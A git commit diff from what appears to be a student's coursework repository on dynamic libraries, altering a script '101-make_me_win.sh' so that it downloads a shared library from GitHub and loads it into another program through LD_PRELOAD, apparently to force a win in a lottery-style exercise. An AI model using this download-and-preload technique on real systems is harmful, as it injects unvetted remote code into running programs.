cadbf61773fd6a9510dd1f0843976e5e35c17d7f
oladapsy <dapoodedeyi@yahoo.com>
2023-10-18 20:45:24 -0700

    hack file call

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
-wget -P ../ https://github.com/Oladapsy/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libhack.so
-export LD_PRELOAD=../libhack.so
+
+wget -P .. https://raw.githubusercontent.com/oladapsy/alx-low_level_programming/master/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD="$PWD/../libgiga.so"
